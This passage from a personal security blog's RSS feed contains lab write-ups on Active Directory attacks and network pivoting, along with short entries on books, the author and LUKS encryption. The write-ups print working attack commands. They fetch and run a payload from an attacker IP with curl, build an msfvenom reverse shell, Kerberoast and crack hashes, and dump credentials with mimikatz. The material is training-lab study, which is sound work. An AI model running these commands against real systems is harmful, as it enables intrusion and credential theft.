http.server&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;using curl to download and executing the payload&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl 10.10.15.161:8000/payload.exe -o payload.exe&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./payload.exe&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD5.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Got the Shell&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD6.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;question-2---kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-and-submit-the-account-name-as-your-answer&#34;&gt;Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Enumerating SPNs with setspn.exe&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;setspn.exe -Q */*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD8.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;We got our answer that is - &lt;code&gt;s*****l&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;question-3----crack-the-accounts-password-submit-the-cleartext-value&#34;&gt;Question 3 -  Crack the account&amp;rsquo;s password. Submit the cleartext value.&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;To get the password we can use &lt;code&gt;PowerView&lt;/code&gt;, We can use same method, by running a python server and curl it :&lt;/li&gt;&#xA;&lt;li&gt;Now to import the file we run :&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Import-Module .\PowerView.ps1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD7.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Now that we have it imported, we run to the get the SPN Ticket &lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;:&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD9.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nice! we got the hash, lets crack it using Hashcat, which gives us the password &lt;code&gt;lu***7&lt;/code&gt;:&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;13100&lt;/span&gt; svc_sql_hash /usr/share/wordlists/rockyou.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;question-4---submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-on-ms01&#34;&gt;Question 4 - Submit the contents of the flag.txt file on the Administrator desktop on MS01&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Before we proceed, Let&amp;rsquo;s first get the IP of MS01 by pinging it.. which reveals - &lt;code&gt;172.16.6.**&lt;/code&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD24.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Book Recommendations</title>
      <link>https://vamsi200.github.io/books/</link>
      <pubDate>Fri, 31 Jan 2025 12:52:52 +0530</pubDate>
      <guid>https://vamsi200.github.io/books/</guid>
      <description>&lt;div class=&#34;book-card&#34; style=&#34;display: flex; align-items: flex-start; justify-content: flex-start; margin-bottom: 20px;&#34;&gt;&#xA;    &lt;img src=&#34;https://vamsi200.github.io/images/PMA.jpg&#34; alt=&#34;PMA&#34; class=&#34;book-card-image&#34; style=&#34;width: 150px; height: auto; border-radius: 8px; margin-right: 20px;&#34;&gt;&#xA;    &lt;div class=&#34;book-card-content&#34; style=&#34;display: flex; flex-direction: column;&#34;&gt;&#xA;        &lt;h3 class=&#34;book-card-title&#34; style=&#34;margin: 0; font-size: 1.2em; font-weight: bold;&#34;&gt;Practical Malware Analysis&lt;/h3&gt;&#xA;        &lt;p class=&#34;book-card-category&#34; style=&#34;font-size: 1em; color: #666; margin: 5px 0;&#34;&gt;Cybersecurity&lt;/p&gt;&#xA;        &lt;p class=&#34;book-card-description&#34; style=&#34;font-size: 0.95em; margin-bottom: 10px;&#34;&gt;A hands-on approach to dissecting malware, using real-world examples.&lt;/p&gt;&#xA;    &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;book-card&#34; style=&#34;display: flex; align-items: flex-start; justify-content: flex-start; margin-bottom: 20px;&#34;&gt;&#xA;    &lt;img src=&#34;https://vamsi200.github.io/images/RE4B.jpg&#34; alt=&#34;RE4B&#34; class=&#34;book-card-image&#34; style=&#34;width: 150px; height: auto; border-radius: 8px; margin-right: 20px;&#34;&gt;&#xA;    &lt;div class=&#34;book-card-content&#34; style=&#34;display: flex; flex-direction: column;&#34;&gt;&#xA;        &lt;h3 class=&#34;book-card-title&#34; style=&#34;margin: 0; font-size: 1.2em; font-weight: bold;&#34;&gt;RE4B-EN: Reverse Engineering for Beginners&lt;/h3&gt;&#xA;        &lt;p class=&#34;book-card-category&#34; style=&#34;font-size: 1em; color: #666; margin: 5px 0;&#34;&gt;Reverse Engineering&lt;/p&gt;</description>
    </item>
    <item>
      <title>About Me</title>
      <link>https://vamsi200.github.io/about/</link>
      <pubDate>Wed, 29 Jan 2025 17:03:07 +0530</pubDate>
      <guid>https://vamsi200.github.io/about/</guid>
      <description>&lt;h1 id=&#34;vamsi1--user-manual&#34;&gt;VAMSI(1) &amp;ndash; USER MANUAL&lt;/h1&gt;&#xA;&lt;h2 id=&#34;name&#34;&gt;NAME&lt;/h2&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vamsi&lt;/strong&gt; &amp;ndash; Software Engineer | Security Enthusiast&lt;/p&gt;&#xA;&lt;h2 id=&#34;synopsis&#34;&gt;SYNOPSIS&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;vamsi [ --code ] [ --infrastructure ] [ --security ]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;description&#34;&gt;DESCRIPTION&lt;/h2&gt;&#xA;&lt;p&gt;Vamsi is a software engineer with a passion for building robust systems and&#xA;exploring the world of cybersecurity. Enjoys tackling complex problems and&#xA;learning new technologies.&lt;/p&gt;&#xA;&lt;h2 id=&#34;options&#34;&gt;OPTIONS&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;--languages 💻&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Python, Rust, C, Bash, SQL&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;--infrastructure ⚙️&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kafka, Kubernetes, Docker, Git&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;--security 🛡️&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Linux Hardening, Network Security, CTFs&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;--currently-exploring 🔭&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Encrypting Partitions with LUKS using cryptsetup: A Guide</title>
      <link>https://vamsi200.github.io/posts/using_cryptsetup_to_encrypt_partitions/</link>
      <pubDate>Tue, 28 Jan 2025 14:50:56 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/using_cryptsetup_to_encrypt_partitions/</guid>
      <description>&lt;h2 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Administrative (sudo) privileges&lt;/li&gt;&#xA;&lt;li&gt;A backup of any existing data on the target partition&lt;/li&gt;&#xA;&lt;li&gt;The partition you want to encrypt (in this guide, we&amp;rsquo;ll use &lt;code&gt;/dev/sdb2&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;installing-cryptsetup&#34;&gt;Installing cryptsetup&lt;/h2&gt;&#xA;&lt;p&gt;Choose the appropriate command for your distribution:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;For Debian/Ubuntu:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install cryptsetup&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;For distributions using pacman:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo pacman -Sy cryptsetup&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;encryption-process&#34;&gt;Encryption Process&lt;/h2&gt;&#xA;&lt;h3 id=&#34;1-initialize-luks-encryption&#34;&gt;1. Initialize LUKS Encryption&lt;/h3&gt;&#xA;&lt;p&gt;⚠️ &lt;strong&gt;WARNING&lt;/strong&gt;: Before we proceed, please make sure you have a BACKUP OF THE DATA somewhere.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Pivoting, Tunneling, and Port Forwarding - Skill Assessment</title>
      <link>https://vamsi200.github.io/posts/pivotingtunnelingand_portforwarding-skill_assessment/</link>
      <pubDate>Tue, 21 Jan 2025 20:14:58 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/pivotingtunnelingand_portforwarding-skill_assessment/</guid>
      <description>&lt;h2 id=&#34;initial-access&#34;&gt;Initial Access&lt;/h2&gt;&#xA;&lt;h3 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h3&gt;&#xA;&lt;p&gt;As from the objectives of the assessment, we start from the webshell, found two user accounts in the &lt;code&gt;/home&lt;/code&gt; directory:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Webadmin&lt;/strong&gt;: Primary target for initial access&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Administrator&lt;/strong&gt;: Potential privilege escalation target&lt;/li&gt;&#xA;&lt;li&gt;Only &lt;code&gt;webadmin&lt;/code&gt; was accessible&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/first_one.png&#34; alt=&#34;Users in Home Directory&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;critical-findings&#34;&gt;Critical Findings&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;A private SSH key belonging to the &lt;code&gt;webadmin&lt;/code&gt; user&lt;/li&gt;&#xA;&lt;li&gt;A file named &amp;ldquo;for-admin-eyes-only&amp;rdquo; containing credentials&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/7.png&#34; alt=&#34;Files&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;reverse-shell-using-metasploit&#34;&gt;Reverse Shell Using Metasploit&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Payload Generation&lt;/strong&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;lt;attacker_ip&amp;gt; -f elf -o payload LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/3.png&#34; alt=&#34;Payload Generation&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Payload Delivery&lt;/strong&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m http&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;server&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/4.png&#34; alt=&#34;Metasploit Listener&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Metasploit Listener Configuration&lt;/strong&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use exploit/multi/handler&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set LHOST 0.0.0.0&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set LPORT &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set payload linux/x64/meterpreter/reverse_tcp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/5.png&#34; alt=&#34;Reverse Shell&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h2 id=&#34;network-enumeration&#34;&gt;Network Enumeration&lt;/h2&gt;&#xA;&lt;h3 id=&#34;network-discovery&#34;&gt;Network Discovery&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Performed ping sweep and found the internal IP &lt;code&gt;172.16.5.35&lt;/code&gt;:&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;run post/multi/gather/ping_sweep RHOSTS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;172.16.5.0/23&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/6.png&#34; alt=&#34;Ping Sweep Results&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;dynamic-tunneling-using-ssh&#34;&gt;Dynamic Tunneling Using SSH&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;As We found the private key to webadmin, we can Dynamic Port Forward using ssh(or use Metasploit as an Socks Proxy):&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh -i id_rsa -D &lt;span style=&#34;color:#ae81ff&#34;&gt;9050&lt;/span&gt; webadmin@&amp;lt;target_ip&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/8.png&#34; alt=&#34;Dynamic Port Forwarding&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;lateral-movement&#34;&gt;Lateral Movement&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Used Proxychains to login with discovered credentials&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/9.png&#34; alt=&#34;Proxychains Login&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Located first flag&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/10.png&#34; alt=&#34;First Flag&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Next the question was &lt;code&gt;what user was vulnerable?&lt;/code&gt;, We can tell the user &amp;lsquo;vfrank&amp;rsquo;(I just checked the users folder, so I just submitted it as user), now we have to how this user is vulnerable.. well one obvious answer would be active directory(LSASS) so I just copied mimikatz and ran it.&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;privilege::debug&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sekurlsa::logonpasswords&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;li&gt;Confirmed vulnerable user account: &lt;code&gt;vfrank&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Successfully extracted cleartext passwords&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/12.png&#34; alt=&#34;Mimikatz Credential Dump&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;network-enumeration-1&#34;&gt;Network Enumeration&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Scanned for additional systems:&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;/L&lt;/span&gt; %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reply&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;li&gt;Located target IP: &lt;code&gt;172.16.6.25&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Established RDP connection with the credentials.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;final-access&#34;&gt;Final Access&lt;/h2&gt;&#xA;&lt;h3 id=&#34;flag-retrieval&#34;&gt;Flag Retrieval&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Located flag in &lt;code&gt;C:\&lt;/code&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/14.jpg&#34; alt=&#34;RDP Access&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;domain-controller-access&#34;&gt;Domain Controller Access&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Successfully identified the domain 